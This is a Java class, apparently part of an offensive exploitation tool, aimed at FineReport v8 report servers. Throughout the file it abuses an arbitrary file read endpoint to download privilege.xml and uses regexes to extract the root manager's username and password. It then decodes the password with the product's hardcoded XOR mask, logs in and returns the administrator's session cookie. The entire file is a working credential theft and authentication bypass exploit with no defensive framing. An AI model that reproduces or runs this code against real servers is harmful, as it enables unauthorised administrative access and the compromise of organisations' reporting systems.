package com.droplab.Controller.FineReport.Common;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import org.jsoup.Connection;

import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class V8UploadCommon {
    private final String GetPassUrl = "/WebReport/ReportServer?op=fr_remote_design&cmd=design_open_resource&&resource=privilege.xml&_=%s";
    private final String GetPassUrl2 = "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml";

    private final String LoginUrl = "/WebReport/ReportServer?op=fs_load&cmd=login";

    public V8UploadCommon() {
    }

    /**
     * 通过任意文件读取获取获取账户密码并且登录。
     *
     * @return
     */
    public String getCookie(String url) {
        if (url.equals("") || url == null) {
            return null;
        } else {
            String cookie = null;
            String UrlSend = null;
            String content = null;
            try {
                long timeMillis = System.currentTimeMillis();
                String time = String.valueOf(timeMillis);
                UrlSend = url + String.format(GetPassUrl, time);
                HashMap<String, String> headers = new HashMap<>();
                CommonUtils.hashMapClone(InfoUtils.headers, headers);
                headers.put("Referer", url);
                Connection.Response response = HttpUtils.get(UrlSend, headers); //请求privilege.xml
                content = new String(response.bodyAsBytes());
                if (response.bodyAsBytes().length > 0 && content.contains("rootManagerPassword")) {

                } else {
                    UrlSend = url + GetPassUrl2;
                    response = HttpUtils.get(UrlSend, headers);
                    content = new String(response.bodyAsBytes());
                    if (response.bodyAsBytes().length > 0 && content.contains("rootManagerPassword")) {

                    } else {
                        return null;
                    }
                }
                String pattern = "<rootManagerPassword>\\s*(<!\\[CDATA\\[)*([_0-9a-zA-Z]*)(\\]\\]>)*\\s*</rootManagerPassword>";
                String namePattern = "<rootManagerName>\\s*(<!\\[CDATA\\[)*([_\\-0-9a-zA-Z]*)(\\]\\]>)*\\s*</rootManagerName>";
                Pattern r = Pattern.compile(namePattern);
                Matcher m = r.matcher(content);
                String username = null;
                String password = null;
                if (m.find()) {  //获取用户名
                    username = m.group(2);
                } else {
                    username = "admin";
                }

                r = Pattern.compile(pattern);
                m = r.matcher(content);
                if (m.find()) { //密码获取成功
                    String RootPass = m.group(2);
                    password = passwordDecode(RootPass);
                    //准备登录
                    cookie = loginFineReport(username, password,url);
                    if(cookie != null){
                        return cookie;
                    }else {
                        return null;
                    }
                } else {  //密码获取失败
                    return null;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }
    }

    public String loginFineReport(String username, String password,String url) {
        try {
            HashMap paramMap = new HashMap();
            paramMap.put("fr_username", username);
            paramMap.put("fr_password", password);
            paramMap.put("fr_remember", "false");
            paramMap.put("theme", "");
            String UrlSend=url+LoginUrl;
            HashMap<String, String> headers = new HashMap<>();
            CommonUtils.hashMapClone(InfoUtils.headers, headers);
            headers.put("Referer", UrlSend);
            headers.put("X-Requested-With","XMLHttpRequest");
            Connection.Response response = HttpUtils.post(headers, UrlSend, paramMap);
            boolean jsessionid = response.hasCookie("JSESSIONID");
            if (jsessionid){
                return "JSESSIONID="+response.cookie("JSESSIONID")+"; ";
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public String passwordDecode(String var0) {
        int[] PASSWORD_MASK_ARRAY = new int[]{19, 78, 10, 15, 100, 213, 43, 23};
        if (var0 != null && var0.startsWith("___")) {
            var0 = var0.substring(3);
            StringBuilder var1 = new StringBuilder();
            int var2 = 0;

            for (int var3 = 0; var3 <= var0.length() - 4; var3 += 4) {
                if (var2 == PASSWORD_MASK_ARRAY.length) {
                    var2 = 0;
                }

                String var4 = var0.substring(var3, var3 + 4);
                int var5 = Integer.parseInt(var4, 16) ^ PASSWORD_MASK_ARRAY[var2];
                var1.append((char) var5);
                ++var2;
            }

            var0 = var1.toString();
        }
        return var0;
    }
}
